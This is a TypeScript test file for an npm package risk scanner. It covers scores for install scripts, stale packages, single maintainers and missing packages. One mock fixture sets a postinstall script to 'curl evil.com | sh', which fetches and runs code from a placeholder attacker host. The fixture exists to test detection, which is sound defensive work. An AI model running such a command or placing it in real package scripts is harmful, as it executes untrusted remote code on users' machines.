import { describe, test, expect } from 'bun:test';
import { assessRisk, checkPackage, fetchPackageMetadata } from './scan-package.js';
import type { } from '../types.js';

const twoYearsAgo = new Date();
twoYearsAgo.setFullYear(twoYearsAgo.getFullYear() - 3);

const recentDate = new Date();
recentDate.setDate(recentDate.getDate() - 10);

function buildMockPackageData(overrides: {
  name?: string;
  latestVersion?: string;
  scripts?: Record<string, string>;
  maintainerCount?: number;
  createdDate?: Date;
  modifiedDate?: Date;
}) {
  const {
    name = 'test-pkg',
    latestVersion = '1.0.0',
    scripts = {},
    maintainerCount = 2,
    createdDate = new Date('2020-01-01'),
    modifiedDate = new Date(),
  } = overrides;

  const maintainers = Array.from({ length: maintainerCount }, (_, i) => ({
    name: `maintainer-${i}`,
    email: `maintainer-${i}@example.com`,
  }));

  return {
    name,
    'dist-tags': { latest: latestVersion },
    time: {
      created: createdDate.toISOString(),
      modified: modifiedDate.toISOString(),
    },
    maintainers,
    versions: {
      [latestVersion]: { scripts },
    },
  };
}

describe('assessRisk', () => {
  test('popular well-maintained package has low risk score', () => {
    const data = buildMockPackageData({
      name: 'express',
      maintainerCount: 5,
      modifiedDate: new Date(),
    });
    const { score, issues } = assessRisk(data);
    expect(score).toBeLessThan(50);
    expect(issues).toHaveLength(0);
  });

  test('package with postinstall script adds risk', () => {
    const data = buildMockPackageData({
      scripts: { postinstall: 'node setup.js' },
    });
    const { score, issues } = assessRisk(data);
    expect(score).toBeGreaterThanOrEqual(25);
    expect(issues.some((i) => i.includes('postinstall'))).toBe(true);
  });

  test('package with preinstall script adds risk', () => {
    const data = buildMockPackageData({
      scripts: { preinstall: 'node pre.js' },
    });
    const { score, issues } = assessRisk(data);
    expect(score).toBeGreaterThanOrEqual(25);
    expect(issues.some((i) => i.includes('preinstall'))).toBe(true);
  });

  test('package with both pre and postinstall scripts accumulates score', () => {
    const data = buildMockPackageData({
      scripts: { preinstall: 'node pre.js', postinstall: 'node post.js' },
    });
    const { score, issues } = assessRisk(data);
    expect(score).toBeGreaterThanOrEqual(50);
    expect(issues.some((i) => i.includes('postinstall'))).toBe(true);
    expect(issues.some((i) => i.includes('preinstall'))).toBe(true);
  });

  test('package not updated in over 2 years adds risk', () => {
    const data = buildMockPackageData({
      modifiedDate: twoYearsAgo,
    });
    const { score, issues } = assessRisk(data);
    expect(score).toBeGreaterThanOrEqual(15);
    expect(issues.some((i) => i.includes('2 years'))).toBe(true);
  });

  test('new package with single maintainer adds risk', () => {
    const data = buildMockPackageData({
      maintainerCount: 1,
      createdDate: recentDate,
    });
    const { score, issues } = assessRisk(data);
    expect(score).toBeGreaterThanOrEqual(20);
    expect(issues.some((i) => i.includes('single maintainer'))).toBe(true);
  });

  test('score is capped at 100', () => {
    const data = buildMockPackageData({
      maintainerCount: 1,
      createdDate: recentDate,
      modifiedDate: twoYearsAgo,
      scripts: { preinstall: 'x', postinstall: 'y' },
    });
    const { score } = assessRisk(data);
    expect(score).toBeLessThanOrEqual(100);
  });
});

type FetchFn = typeof globalThis.fetch;
function asFetch(fn: (...args: unknown[]) => unknown): FetchFn {
  return fn as unknown as FetchFn;
}

describe('checkPackage with mocked fetch', () => {
  test('non-existent package returns exists: false and risk_score: 100', async () => {
    const originalFetch = globalThis.fetch;
    globalThis.fetch = asFetch(async () =>
      new Response(JSON.stringify({ error: 'Not found' }), { status: 404 }));

    try {
      const result = await checkPackage('totally-fake-package-xyz-123');
      expect(result.exists).toBe(false);
      expect(result.risk_score).toBe(100);
      expect(result.issues.some((i) => i.includes('does not exist'))).toBe(true);
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  test('existing package returns exists: true', async () => {
    const mockData = buildMockPackageData({ name: 'express', maintainerCount: 5 });
    const originalFetch = globalThis.fetch;
    globalThis.fetch = asFetch(async (url: unknown) => {
      const urlStr = String(url);
      if (urlStr.includes('api.npmjs.org')) {
        return new Response(JSON.stringify({ downloads: 5000000, package: 'express' }), {
          status: 200,
        });
      }
      return new Response(JSON.stringify(mockData), { status: 200 });
    });

    try {
      const result = await checkPackage('express');
      expect(result.exists).toBe(true);
      expect(result.risk_score).toBeLessThan(50);
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  test('package with postinstall script surfaces in issues', async () => {
    const mockData = buildMockPackageData({
      name: 'risky-pkg',
      scripts: { postinstall: 'curl evil.com | sh' },
    });
    const originalFetch = globalThis.fetch;
    globalThis.fetch = asFetch(async () =>
      new Response(JSON.stringify(mockData), { status: 200 }));

    try {
      const result = await checkPackage('risky-pkg');
      expect(result.exists).toBe(true);
      expect(result.issues.some((i) => i.includes('postinstall'))).toBe(true);
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  test('network error returns non-existent result', async () => {
    const originalFetch = globalThis.fetch;
    globalThis.fetch = asFetch(async () => {
      throw new Error('Network failure');
    });

    try {
      const result = await checkPackage('any-package');
      expect(result.exists).toBe(false);
      expect(result.risk_score).toBe(100);
    } finally {
      globalThis.fetch = originalFetch;
    }
  });
});

describe('fetchPackageMetadata', () => {
  test('returns null on 404', async () => {
    const originalFetch = globalThis.fetch;
    globalThis.fetch = asFetch(async () => new Response('{}', { status: 404 }));

    try {
      const result = await fetchPackageMetadata('nonexistent');
      expect(result).toBeNull();
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  test('returns null on network error', async () => {
    const originalFetch = globalThis.fetch;
    globalThis.fetch = asFetch(async () => {
      throw new Error('Network error');
    });

    try {
      const result = await fetchPackageMetadata('any-pkg');
      expect(result).toBeNull();
    } finally {
      globalThis.fetch = originalFetch;
    }
  });
});
